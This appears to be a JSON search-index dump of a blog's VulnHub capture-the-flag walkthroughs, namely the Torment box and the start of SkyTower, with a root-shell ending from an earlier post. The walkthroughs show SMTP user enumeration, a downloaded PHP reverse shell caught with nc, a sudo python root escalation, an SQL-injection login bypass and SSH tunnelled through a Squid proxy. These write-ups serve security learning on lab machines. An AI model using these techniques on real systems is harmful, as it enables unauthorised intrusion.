root@chilakiller:/etc/openvpn/client/.config# whoamirootroot@chilakiller:/etc/openvpn/client/.config# iduid=0(root) gid=0(root) groups=0(root),1001(ch)root@chilakiller:/etc/openvpn/client/.config# cd /rootroot@chilakiller:~# ls -altotal 36drwx------ 6 root root 4096 Apr 28 2021 .drwxr-xr-x 23 root root 4096 Jul 31 2020 ..lrwxrwxrwx 1 root root 9 Jul 31 2020 .bash_history -> /dev/null-rw-r--r-- 1 root root 570 Jan 31 2010 .bashrcdrwx------ 2 root root 4096 Jul 31 2020 .cachedrwxr-xr-x 6 root root 4096 Aug 1 2020 .config-rw------- 1 root root 41 Aug 4 2020 FLAG2.txtdrwxr-xr-x 3 root root 4096 Aug 1 2020 .locallrwxrwxrwx 1 root root 9 Aug 1 2020 .mysql_history -> /dev/nulldrwxr-xr-x 2 root root 4096 Apr 28 2021 .nano-rw-r--r-- 1 root root 148 Aug 17 2015 .profileroot@chilakiller:~# cat FLAG2.txtccc61a1d18a937cc3db531a5216a04a805d54762root@chilakiller:~#```{: .nolineno}I am root now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Torment", "url": "/posts/Torment/", "categories": "VulnHub", "tags": "FTP, RPC, apache2.conf, ngIRCd, smtp-user-enum, PrivEsc", "date": "2023-09-15 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸![Untitled](/Vulnhub-Files/img/Torment/Untitled.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/Torment]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 192.168.249.135 ...", "content": "## Port Scan Results â¤µï¸![Untitled](/Vulnhub-Files/img/Torment/Untitled.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/Torment]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 192.168.249.135 1 âš™Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-14 21:53 ISTNmap scan report for 192.168.249.135Host is up (0.00083s latency).Not shown: 65516 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.0.8 or later| ftp-anon: Anonymous FTP login allowed (FTP code 230)| -rw-r--r-- 1 ftp ftp 112640 Sep 15 00:20 alternatives.tar.0| -rw-r--r-- 1 ftp ftp 5589 Dec 28 2018 alternatives.tar.1.gz| -rw-r--r-- 1 ftp ftp 4984 Dec 23 2018 alternatives.tar.2.gz| -rw-r--r-- 1 ftp ftp 95766 Jun 16 2022 apt.extended_states.0| -rw-r--r-- 1 ftp ftp 10696 Dec 28 2018 apt.extended_states.1.gz| -rw-r--r-- 1 ftp ftp 10513 Dec 27 2018 apt.extended_states.2.gz| -rw-r--r-- 1 ftp ftp 10437 Dec 26 2018 apt.extended_states.3.gz| -rw-r--r-- 1 ftp ftp 559 Dec 23 2018 dpkg.diversions.0| -rw-r--r-- 1 ftp ftp 229 Dec 23 2018 dpkg.diversions.1.gz| -rw-r--r-- 1 ftp ftp 229 Dec 23 2018 dpkg.diversions.2.gz| -rw-r--r-- 1 ftp ftp 229 Dec 23 2018 dpkg.diversions.3.gz| -rw-r--r-- 1 ftp ftp 229 Dec 23 2018 dpkg.diversions.4.gz| -rw-r--r-- 1 ftp ftp 229 Dec 23 2018 dpkg.diversions.5.gz| -rw-r--r-- 1 ftp ftp 229 Dec 23 2018 dpkg.diversions.6.gz| -rw-r--r-- 1 ftp ftp 505 Jun 16 2022 dpkg.statoverride.0| -rw-r--r-- 1 ftp ftp 295 Dec 28 2018 dpkg.statoverride.1.gz| -rw-r--r-- 1 ftp ftp 295 Dec 28 2018 dpkg.statoverride.2.gz| -rw-r--r-- 1 ftp ftp 295 Dec 28 2018 dpkg.statoverride.3.gz| -rw-r--r-- 1 ftp ftp 295 Dec 28 2018 dpkg.statoverride.4.gz| -rw-r--r-- 1 ftp ftp 295 Dec 28 2018 dpkg.statoverride.5.gz|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:192.168.249.128| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 2| vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey: | 2048 84:c7:31:7a:21:7d:10:d3:a9:9c:73:c2:c2:2d:d6:77 (RSA)| 256 a5:12:e7:7f:f0:17:ce:f1:6a:a5:bc:1f:69:ac:14:04 (ECDSA)|_ 256 66:c7:d0:be:8d:9d:9f:bf:78:67:d2:bc:cc:7d:33:b9 (ED25519)25/tcp open smtp Postfix smtpd|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=TORMENT| Subject Alternative Name: DNS:TORMENT| Not valid before: 2018-12-23T14:28:47|_Not valid after: 2028-12-20T14:28:47|_smtp-commands: TORMENT.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF880/tcp open http Apache httpd 2.4.25|_http-title: Apache2 Debian Default Page: It works|_http-server-header: Apache/2.4.25111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100003 3,4 2049/tcp nfs| 100003 3,4 2049/tcp6 nfs| 100003 3,4 2049/udp nfs| 100003 3,4 2049/udp6 nfs| 100005 1,2,3 45774/udp6 mountd| 100005 1,2,3 47155/udp mountd| 100005 1,2,3 54677/tcp6 mountd| 100005 1,2,3 56197/tcp mountd| 100021 1,3,4 36783/tcp6 nlockmgr| 100021 1,3,4 42076/udp nlockmgr| 100021 1,3,4 44221/udp6 nlockmgr| 100021 1,3,4 44491/tcp nlockmgr| 100227 3 2049/tcp nfs_acl| 100227 3 2049/tcp6 nfs_acl| 100227 3 2049/udp nfs_acl|_ 100227 3 2049/udp6 nfs_acl139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)143/tcp open imap Dovecot imapd|_imap-capabilities: AUTH=LOGINA0001 OK post-login have ENABLE IMAP4rev1 ID AUTH=PLAIN LITERAL+ SASL-IR more listed capabilities IDLE LOGIN-REFERRALS Pre-login445/tcp open @ Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)631/tcp open ipp CUPS 2.2| http-robots.txt: 1 disallowed entry |_/|_http-title: Home - CUPS 2.2.1| http-methods: |_ Potentially risky methods: PUT|_http-server-header: CUPS/2.2 IPP/2.12049/tcp open nfs 3-4 (RPC #100003)6667/tcp open irc ngircd6668/tcp open irc ngircd6669/tcp open irc ngircd6672/tcp open irc ngircd6674/tcp open irc ngircd44431/tcp open mountd 1-3 (RPC #100005)44491/tcp open nlockmgr 1-4 (RPC #100021)45057/tcp open mountd 1-3 (RPC #100005)56197/tcp open mountd 1-3 (RPC #100005)MAC Address: 00:0C:29:73:5C:60 (VMware)Service Info: Hosts: TORMENT.localdomain, TORMENT, irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb-os-discovery: | OS: Windows 6.1 (Samba 4.5.16-Debian)| Computer name: torment| NetBIOS computer name: TORMENT\\x00| Domain name: \\x00| FQDN: torment|_ System time: 2023-09-15T00:24:03+08:00| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required|_clock-skew: mean: -2h39m57s, deviation: 4h37m07s, median: 2s| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_nbstat: NetBIOS name: TORMENT, NetBIOS user: , NetBIOS MAC: (unknown)| smb2-time: | date: 2023-09-14T16:24:03|_ start_date: N/AService detection performed.```{: .nolineno}## Web Enumeration â¤µï¸Lets check port 80 first â†’![Untitled](/Vulnhub-Files/img/Torment/Untitled%201.png)Now lets check the port 631 that is CUPS 2.2.1 and I searched on web and its is not vulnerable so â†’![Untitled](/Vulnhub-Files/img/Torment/Untitled%202.png)I have to find users and I also got smtp service open so lets use the Tool named as `smtp-user-enum.pl` written in perl language and used for username enumeration â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/Torment/FTP]â””â”€$ perl /usr/share/legion/scripts/smtp-user-enum.pl -M VRFY -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 192.168.249.135 Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum ) ----------------------------------------------------------| Scan Information | ----------------------------------------------------------Mode ..................... VRFYWorker Processes ......... 5Usernames file ........... /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txtTarget count ............. 1Username count ........... 8295455Target TCP port .......... 25Query timeout ............ 5 secsTarget domain ............ ######## Scan started at Thu Sep 14 22:45:14 2023 #########192.168.249.135: mail exists192.168.249.135: patrick exists192.168.249.135: webmaster exists192.168.249.135: root exists192.168.249.135: news exists192.168.249.135: man exists192.168.249.135: Patrick exists192.168.249.135: bin exists192.168.249.135: qiu exists192.168.249.135: games exists192.168.249.135: nobody exists192.168.249.135: security exists192.168.249.135: backup exists192.168.249.135: daemon exists192.168.249.135: proxy exists192.168.249.135: PATRICK exists192.168.249.135: list exists192.168.249.135: Man exists192.168.249.135: Daemon exists192.168.249.135: postmaster exists192.168.249.135: sys exists192.168.249.135: Proxy exists192.168.249.135: pulse exists192.168.249.135: Marc%20Ludlum 454 4.7.1 : Relay access denied..192.168.249.135: Nobody exists192.168.249.135: Security exists192.168.249.135: ftp exists^C```{: .nolineno}And I got the 2 users as `patrick` and `qiu` from above scan.Now I also noticed the FTP server running and I have the anonymous login enabled so lets access that and its whole data in our system â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/Torment/FTP]â””â”€$ ftp 192.168.249.144 21 1 âš™Connected to 192.168.249.144.220 vsftpd (broken)Name (192.168.249.144:kali): Anonymous331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp> ls -al229 Entering Extended Passive Mode (|||43266|)150 Here comes the directory listing.drwxr-xr-x 11 ftp ftp 4096 Sep 15 00:20 .drwxr-xr-x 11 ftp ftp 4096 Sep 15 00:20 ..drwxr-xr-x 2 ftp ftp 4096 Dec 31 2018 .cupsdrwxr-xr-x 2 ftp ftp 4096 Dec 31 2018 .ftpdrwxr-xr-x 2 ftp ftp 4096 Dec 31 2018 .imapdrwxr-xr-x 2 ftp ftp 4096 Dec 31 2018 .mysqldrwxr-xr-x 2 ftp ftp 4096 Dec 31 2018 .nfsdrwxr-xr-x 2 ftp ftp 4096 Jan 04 2019 .ngircddrwxr-xr-x 2 ftp ftp 4096 Dec 31 2018 .sambadrwxr-xr-x 2 ftp ftp 4096 Dec 31 2018 .smtpdrwxr-xr-x 2 ftp ftp 4096 Jan 04 2019 .ssh-rw-r--r-- 1 ftp ftp 112640 Sep 15 00:20 alternatives.tar.0-rw-r--r-- 1 ftp ftp 5589 Dec 28 2018 alternatives.tar.1.gz-rw-r--r-- 1 ftp ftp 4984 Dec 23 2018 alternatives.tar.2.gz-rw-r--r-- 1 ftp ftp 95766 Jun 16 2022 apt.extended_states.0-rw-r--r-- 1 ftp ftp 10696 Dec 28 2018 apt.extended_states.1.gz-rw-r--r-- 1 ftp ftp 10513 Dec 27 2018 apt.extended_states.2.gz-rw-r--r-- 1 ftp ftp 10437 Dec 26 2018 apt.extended_states.3.gz-rw-r--r-- 1 ftp ftp 559 Dec 23 2018 dpkg.diversions.0-rw-r--r-- 1 ftp ftp 229 Dec 23 2018 dpkg.diversions.1.gz-rw-r--r-- 1 ftp ftp 229 Dec 23 2018 dpkg.diversions.2.gz-rw-r--r-- 1 ftp ftp 229 Dec 23 2018 dpkg.diversions.3.gz-rw-r--r-- 1 ftp ftp 229 Dec 23 2018 dpkg.diversions.4.gz-rw-r--r-- 1 ftp ftp 229 Dec 23 2018 dpkg.diversions.5.gz-rw-r--r-- 1 ftp ftp 229 Dec 23 2018 dpkg.diversions.6.gz-rw-r--r-- 1 ftp ftp 505 Jun 16 2022 dpkg.statoverride.0-rw-r--r-- 1 ftp ftp 295 Dec 28 2018 dpkg.statoverride.1.gz-rw-r--r-- 1 ftp ftp 295 Dec 28 2018 dpkg.statoverride.2.gz-rw-r--r-- 1 ftp ftp 295 Dec 28 2018 dpkg.statoverride.3.gz-rw-r--r-- 1 ftp ftp 295 Dec 28 2018 dpkg.statoverride.4.gz-rw-r--r-- 1 ftp ftp 295 Dec 28 2018 dpkg.statoverride.5.gz-rw-r--r-- 1 ftp ftp 281 Dec 27 2018 dpkg.statoverride.6.gz-rw-r--r-- 1 ftp ftp 1721410 Jun 16 2022 dpkg.status.0-rw-r--r-- 1 ftp ftp 493252 Jan 01 2019 dpkg.status.1.gz-rw-r--r-- 1 ftp ftp 493252 Jan 01 2019 dpkg.status.2.gz-rw-r--r-- 1 ftp ftp 493252 Jan 01 2019 dpkg.status.3.gz-rw-r--r-- 1 ftp ftp 492279 Dec 28 2018 dpkg.status.4.gz-rw-r--r-- 1 ftp ftp 492279 Dec 28 2018 dpkg.status.5.gz-rw-r--r-- 1 ftp ftp 489389 Dec 28 2018 dpkg.status.6.gz-rw------- 1 ftp ftp 1010 Dec 31 2018 group.bak-rw------- 1 ftp ftp 840 Dec 31 2018 gshadow.bak-rw------- 1 ftp ftp 2485 Dec 31 2018 passwd.bak-rw------- 1 ftp ftp 1575 Dec 31 2018 shadow.bak226 Directory send OK.ftp>```{: .nolineno}Now we have `id_rsa` private key from .ssh directory and the `channels` from `.ngircd` that is used as a chat application so I guess the RPC gets connection through this ngIRCd is a free, portable and lightweight Internet Relay Chat server .So for accessing that I need a chat client application that is , ***Pidgin***Â  which is a universal chat client, allowing you to consolidate all your different messaging apps into a singleÂ ***tool***. I used the default password of ngIRCd configuration file `/etc/ngircd/ngircd.conf` â†’![Untitled](/Vulnhub-Files/img/Torment/Untitled%203.png)```bashDefault password : wealllikedebian```{: .nolineno}Now lets use the pidgin application and access some chats â†’![Untitled](/Vulnhub-Files/img/Torment/Untitled%204.png)Now I clicked on Add and I selected the Join a Chat option from Buddies menu â†’![Untitled](/Vulnhub-Files/img/Torment/Untitled%205.png)Since we have 2 channels so lets access them â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/Torment/FTP]â””â”€$ cat channels 1 âš™channels:gamestormentedprinter```{: .nolineno}Since I got nothing from patrick account so lets switch the user to â†’![Untitled](/Vulnhub-Files/img/Torment/Untitled%206.png)Now I clicked on Room List with user qiu profile added into it and I got this text message â†’```bash(11:46:30 AM) The topic for #tormentedprinter is: If you find that the printers are not printing as they should, you can configure them and check for jammed jobs by logging in with the password \"mostmachineshaveasupersecurekeyandalongpassphrase\".(11:46:30 AM) Topic for #tormentedprinter set by -Server- at 09:45:12 PM on 09/14/2023```{: .nolineno}In games I got this â†’![Untitled](/Vulnhub-Files/img/Torment/Untitled%207.png)Now I have a paraphrase password so lets do SSH now â†’## SSH Login â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/Torment]â””â”€$ chmod 600 id_rsaâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/Torment]â””â”€$ sudo ssh -i id_rsa patrick@192.168.249.144 255 â¨¯Enter passphrase for key 'id_rsa': Linux TORMENT 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Fri Jan 4 19:34:43 2019 from 192.168.254.139patrick@TORMENT:~$```{: .nolineno}Now lets dig deeper as we did the Local Privilege Escalation :Now I checked the permission that patrick user has that can lead me to root user â†’```bashpatrick@TORMENT:~$ sudo -lMatching Defaults entries for patrick on TORMENT: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser patrick may run the following commands on TORMENT: (ALL) NOPASSWD: /bin/systemctl poweroff, /bin/systemctl halt, /bin/systemctl rebootpatrick@TORMENT:~$```{: .nolineno}and I also checked the full control permission file of from user patrick and I got this â†’```bashpatrick@TORMENT:/tmp$ find / -perm 777 -type f 2>/dev/null/etc/apache2/apache2.conf/var/www/html/index.html```{: .nolineno}So in `/etc/apache2/apache2.conf` , basically I have to include the evironment variable as `User qiu` so that when I run/load any command from the web browser it will run as qiu users thatâ€™s why â†’![Untitled](/Vulnhub-Files/img/Torment/Untitled%208.png)Now I saved it and , lets upload our php_reverse_shell.php into this system in location /var/www/html â†’```bashpatrick@TORMENT:/var/www/html$ wget http://192.168.249.128/shell.php--2023-09-15 15:25:54-- http://192.168.249.128/shell.phpConnecting to 192.168.249.128:80... connected.HTTP request sent, awaiting response... 200 OKLength: 5497 (5.4K) [application/octet-stream]Saving to: â€˜shell.phpâ€™shell.php 100%[======================================================>] 5.37K --.-KB/s in 0s 2023-09-15 15:25:54 (861 MB/s) - â€˜shell.phpâ€™ saved [5497/5497]patrick@TORMENT:/var/www/html$ ls -altotal 72drwxrwxrwx 2 www-data www-data 4096 Sep 15 15:25 .drwxr-xr-x 3 root root 4096 Dec 23 2018 ..-rwxrwxrwx 1 www-data www-data 10701 Dec 23 2018 index.html-rw-r--r-- 1 www-data www-data 61 Dec 31 2018 secret-rw-r--r-- 1 patrick patrick 5497 Sep 15 15:25 shell.php-rw-r--r-- 1 www-data www-data 39848 Jan 1 2019 torment.jpgpatrick@TORMENT:/var/www/html$ chmod +x shell.phppatrick@TORMENT:/var/www/html$```{: .nolineno}To make the apache service run asÂ **qiu**Â user we have to restart the apache service but we donâ€™t have the privileges to do so, but at the same time, we can reboot the target system asÂ **reboot**Â command can be executed asÂ **sudoer**Â for the user Patrick**.**![Untitled](/Vulnhub-Files/img/Torment/Untitled%209.png)Now after machine bootup lets load the shell.php file â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/Torment]â””â”€$ nc -lvnp 4444listening on [any] 4444 ...connect to [192.168.249.128] from (UNKNOWN) [192.168.249.144] 58890Linux TORMENT 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux 15:37:25 up 1 min, 0 users, load average: 1.23, 0.53, 0.19USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=0(root) gid=0(root) groups=0(root)/bin/sh: 0: cant access tty; job control turned off# whoamiroot# iduid=0(root) gid=0(root) groups=0(root)# cd /root# ls -altotal 44drwx------ 6 root root 4096 Jan 4 2019 .drwxr-xr-x 23 root root 4096 Jan 4 2019 ..-rw------- 1 root root 56 Jan 4 2019 .bash_history-rw-r--r-- 1 root root 570 Jan 31 2010 .bashrcdrwx------ 2 root root 4096 Dec 23 2018 .cachedrwx------ 5 root root 4096 Dec 31 2018 .configdrwxr-xr-x 3 root root 4096 Dec 31 2018 .localdrwxr-xr-x 2 root root 4096 Dec 24 2018 .nano-rw-r--r-- 1 root root 148 Aug 17 2015 .profile---------- 1 root root 1329 Jan 4 2019 author-secret.txt---------- 1 root root 128 Dec 31 2018 proof.txt# cat proof.txtCongrutulations on rooting TORMENT. I hope this box has been as fun for you as it has been for me. :-)Until then, try harder!# cat author-secret.txtThis is the fourth Linux box written successfully by this author.Unlike the first three, this had no MERCY, took some DEVELOPMENT and required a sheer ton of BRAVERY.Setting puzzles has been an authors joy, even though some of these puzzles may be rather mind-bending. The idea is that, even if we are repeatedly testing the basics, the basics can be morphed into so many different forms. The TORMENT box is a fine example.The privilege escalation, in particular, was inspired from what people would usually learn in Windows privilege escalation --- weak service permissions. In this case, this was extended to Linux through something a little different. Before you think this is fictitious, think for a second --- how many developers have you heard became too lazy to test new configurations, and so decided to chmod 777 themselves? Also, if they cant log in as root directly, they cannot as easily modify /var/www/html, so they do come up with silly ideas there as well.Sigh, a New Year is eve disappeared from rushing out this box. But I think it is worth it.Happy 2019, and many more good years beyond!Soon I will be writing Windows boxes; these you may be able to find on Wizard-Labs, as a favour for a friend. Otherwise you can find me on my site. Root one of the earlier boxes I had to find out where this is.# ip a 1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: ens33: mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 00:0c:29:73:5c:60 brd ff:ff:ff:ff:ff:ff inet 192.168.249.144/24 brd 192.168.249.255 scope global dynamic ens33 valid_lft 1675sec preferred_lft 1675sec inet6 fe80::20c:29ff:fe73:5c60/64 scope link valid_lft forever preferred_lft forever#```{: .nolineno}>This `/etc/apache2/apache2.conf` has to run with qiu user privileges rather than it runs as root user , I think the problem was came in including the User and Group in the configuration file thatâ€™s why.{: .prompt-danger }Now Lets perform that way Lets uncomment that $USERS and $GROUP variables from the configuration files and then save the file and reboot as we did earlier and after restart lets load the file shell.php again and get the shell â†’![Untitled](/Vulnhub-Files/img/Torment/Untitled%2010.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/Torment]â””â”€$ nc -lvnp 4444listening on [any] 4444 ...connect to [192.168.249.128] from (UNKNOWN) [192.168.249.144] 51888Linux TORMENT 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux 15:56:45 up 0 min, 0 users, load average: 1.13, 0.31, 0.10USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=1000(qiu) gid=1000(qiu) groups=1000(qiu),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner)/bin/sh: 0: cant access tty; job control turned off$ /bin/bash -ibash: cannot set terminal process group (728): Inappropriate ioctl for devicebash: no job control in this shellqiu@TORMENT:/$ whoamiwhoamiqiuqiu@TORMENT:/$ ididuid=1000(qiu) gid=1000(qiu) groups=1000(qiu),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner)qiu@TORMENT:/$ pwd/pwdqiu@TORMENT:/$ cd /home/qiucd /home/qiuqiu@TORMENT:/home/qiu$ ls -alls -altotal 96drwx------ 18 qiu qiu 4096 Jan 4 2019 .drwxr-xr-x 4 root root 4096 Dec 27 2018 ..-rwx------ 1 qiu qiu 5152 Jan 4 2019 .ICEauthority-rw------- 1 qiu qiu 187 Jan 4 2019 .bash_history-rwx------ 1 qiu qiu 220 Dec 23 2018 .bash_logout-rwx------ 1 qiu qiu 3526 Dec 23 2018 .bashrcdrwx------ 13 qiu qiu 4096 Dec 27 2018 .cachedrwx------ 12 qiu qiu 4096 Dec 31 2018 .configdrwx------ 3 qiu qiu 4096 Dec 24 2018 .gnupgdrwx------ 3 qiu qiu 4096 Dec 24 2018 .localdrwx------ 5 qiu qiu 4096 Dec 27 2018 .mozilladrwx------ 2 qiu qiu 4096 Dec 24 2018 .nano-rwx------ 1 qiu qiu 675 Dec 23 2018 .profiledrwx------ 2 qiu qiu 4096 Dec 24 2018 .sshdrwx------ 2 qiu qiu 4096 Dec 24 2018 Desktopdrwx------ 2 qiu qiu 4096 Dec 24 2018 Documentsdrwx------ 2 qiu qiu 4096 Dec 31 2018 Downloadsdrwx------ 5 qiu qiu 4096 Dec 27 2018 Maildirdrwx------ 2 qiu qiu 4096 Dec 24 2018 Musicdrwx------ 2 qiu qiu 4096 Dec 24 2018 Picturesdrwx------ 2 qiu qiu 4096 Dec 24 2018 Publicdrwx------ 2 qiu qiu 4096 Dec 24 2018 Templatesdrwx------ 2 qiu qiu 4096 Dec 24 2018 Videosqiu@TORMENT:/home/qiu$ sudo -lsudo -lMatching Defaults entries for qiu on TORMENT: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser qiu may run the following commands on TORMENT: (ALL) NOPASSWD: /usr/bin/python, /bin/systemctlqiu@TORMENT:/home/qiu$ python -c 'import pty;pty.spawn(\"/bin/bash\")'python -c 'import pty;pty.spawn(\"/bin/bash\")'qiu@TORMENT:/home/qiu$ sudo python -c 'import pty;pty.spawn(\"/bin/bash\")'sudo python -c 'import pty;pty.spawn(\"/bin/bash\")'root@TORMENT:/home/qiu# whoamiwhoamirootroot@TORMENT:/home/qiu# ididuid=0(root) gid=0(root) groups=0(root)root@TORMENT:/home/qiu#```{: .nolineno}I am root !! ---> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "SkyTower", "url": "/posts/Skytower/", "categories": "VulnHub", "tags": "Port Forwarding, Proxytunnel, SQLi, PrivEsc", "date": "2023-09-15 00:00:00 +0530", "snippet": "## **Description â¤µï¸**> **Welcome to SkyTower:1****This CTF was designed by Telspace Systems for the CTF at the ITWeb Security Summit and BSidesCPT (Cape Town). The aim is to test intermediate to ad...", "content": "## **Description â¤µï¸**> **Welcome to SkyTower:1****This CTF was designed by Telspace Systems for the CTF at the ITWeb Security Summit and BSidesCPT (Cape Town). The aim is to test intermediate to advanced security enthusiasts in their ability to attack a system using a multi-faceted approach and obtain the \"flag\".****You will require skills across different facets of system and application vulnerabilities, as well as an understanding of various services and how to attack them. Most of all, your logical thinking and methodical approach to penetration testing will come into play to allow you to successfully attack this system. Try different variations and approaches. You will most likely find that automated tools will not assist you.****We encourage you to try it our for yourself first, give yourself plenty of time and then only revert to the s below.****Enjoy!****Telspace Systems****@telspacesystems**{: .prompt-info }### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/Skytower/Untitled.png)```bashIP : 10.0.2.62```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/SkyTower]â””â”€$ sudo nmap -sC -sV -T4 -oN Nmap_results.txt 10.0.2.62 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-12 12:14 ISTNmap scan report for 10.0.2.62Host is up (0.0026s latency).Not shown: 997 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp filtered ssh80/tcp open http Apache httpd 2.2.22 ((Debian))|_http-title: Site does not have a title (text/html).|_http-server-header: Apache/2.2.22 (Debian)3128/tcp open http-proxy Squid http proxy 3.1.20| http-vulners-regex: | /main.aspx: |_ cpe:/a:squid-cache:squid:3.1.20|_http-server-header: squid/3.1.20| http-open-proxy: Potentially OPEN proxy.|_Methods supported: GET HEAD|_http-title: ERROR: The requested URL could not be retrievedMAC Address: 08:00:27:54:4A:37 (Oracle VirtualBox virtual NIC)```{: .nolineno}```bashOPEN PORTS >803128```{: .nolineno}## Web Enumeration â¤µï¸Now on port 80 I got a login page where I tried the SQLi Authentication Bypass payloads and got this error too â†’![Untitled](/Vulnhub-Files/img/Skytower/Untitled%201.png)![Untitled](/Vulnhub-Files/img/Skytower/Untitled%202.png)Now Lets try another payload for Login like this `â€˜ || 1=1 #` and Password is anything random and I got this â†’![Untitled](/Vulnhub-Files/img/Skytower/Untitled%203.png)Now I got the username and password so lets try SSH now I guess â†’```bashUsername: johnPassword: hereisjohn```{: .nolineno}Since the Squid Proxy is in our victim machine â†’![Untitled](/Vulnhub-Files/img/Skytower/Untitled%204.png)And the SSH port is filtered out though scan , we can access the SSH server by proxying the connection through the squid server on the target machine with `proxytunnel command` .```bashproxytunnel -p 10.0.2.62:3128 -d 127.0.0.1:22 -a 2222```{: .nolineno}![Untitled](/Vulnhub-Files/img/Skytower/Untitled%205.png)Now in above picture I redirected the 22 port to 2222 port on victims machine and while accessing it losses connection .So here we have to provide a command to get executed when get the shell and then delete the .bashrc file so that we donâ€™t get this exit outs â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/SkyTower]â””â”€$ sudo ssh john@127.0.0.1 -p 2222 '/bin/bash' john@127.0.0.1 is password: whoamijohniduid=1000(john) gid=1000(john) groups=1000(john)ls -altotal 24drwx------ 2 john john 4096 Jun 20 2014 .drwxr-xr-x 5 root root 4096 Jun 20 2014 ..-rw------- 1 john john 7 Jun 20 2014 .bash_history-rw-r--r-- 1 john john 220 Jun 20 2014 .bash_logout-rw-r--r-- 1 john john 3437 Jun 20 2014 .bashrc-rw-r--r-- 1 john john 675 Jun 20 2014 .profilerm -rf .bashrcls -altotal 20drwx------ 2 john john 4096 Sep 12 03:41 .drwxr-xr-x 5 root root 4096 Jun 20 2014 ..-rw------- 1 john john 7 Jun 20 2014 .bash_history-rw-r--r-- 1 john john 220 Jun 20 2014 .bash_logout-rw-r--r-- 1 john john 675 Jun 20 2014 .profileexit```{: .nolineno}## SSH Login â¤µï¸Now Lets login again â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/SkyTower]â””â”€$ sudo ssh john@127.0.0.1 -p 2222 john@127.0.0.1 is password: Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Tue Sep 12 03:39:01 2023 from localhostjohn@SkyTower:~$```{: .nolineno}and I need to dig deeper for root access :I got something from mySQL server â†’```bashmysql> select * from login;+----+---------------------+--------------+| id | email | password |+----+---------------------+--------------+| 1 